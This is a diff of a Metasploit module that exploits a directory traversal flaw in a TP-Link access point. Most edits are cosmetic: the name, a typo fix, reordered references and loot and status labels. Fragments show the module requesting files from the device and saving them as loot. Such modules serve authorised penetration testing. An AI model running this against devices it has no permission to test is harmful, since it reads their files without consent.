@@ -14,17 +14,19 @@ class Metasploit3 < Msf::Auxiliary
 
 	def initialize
 		super(
-			'Name'        => 'TP-Link Wireless Lite N Access Point - Directory Traversal Vulnerability',
+			'Name'        => 'TP-Link Wireless Lite N Access Point Directory Traversal Vulnerability',
 			'Description' => %q{
-				This module tests whether a directory traversal vulnerablity is present
-				in versions of TP-Link Access Point 3.12.16 Build 120228 Rel.37317n
-				},
+					This module tests whether a directory traversal vulnerability is present in
+				versions of TP-Link Access Point 3.12.16 Build 120228 Rel.37317n.
+			},
 			'References'  =>
 				[
-					[ 'URL', 'http://www.tp-link.com/en/support/download/?model=TL-WA701ND&version=V1' ],
-					[ 'URL', 'http://www.s3cur1ty.de/m1adv2013-011' ],
+					[ 'CVE', '2012-5687' ],
+					[ 'OSVDB', '86881' ],
 					[ 'BID', '57969' ],
-					[ 'EDB', '24504' ]
+					[ 'EDB', '24504' ],
+					[ 'URL', 'http://www.tp-link.com/en/support/download/?model=TL-WA701ND&version=V1' ],
+					[ 'URL', 'http://www.s3cur1ty.de/m1adv2013-011' ]
 				],
 			'Author'      => [ 'm-1-k-3' ],
 			'License'     => MSF_LICENSE
@@ -81,7 +83,7 @@ class Metasploit3 < Msf::Auxiliary
 				:method   => "GET"
 				})
 
-			loot = store_loot("lfi.data","text/plain",rhost, res.body,file)
+			loot = store_loot("tplink.traversal.data","text/plain",rhost, res.body,file)
 			vprint_good("#{rhost}:#{rport} - File #{file} downloaded to: #{loot}")
 
 			if datastore['VERBOSE'] == true
@@ -117,7 +119,7 @@ class Metasploit3 < Msf::Auxiliary
 	def run_host(ip)
 
 		begin
-			print_status("#{rhost}:#{rport} - connecting")
+			vprint_status("#{rhost}:#{rport} - Fingerprinting...")
 			res = send_request_cgi(
 				{
 					'method'  => 'GET',
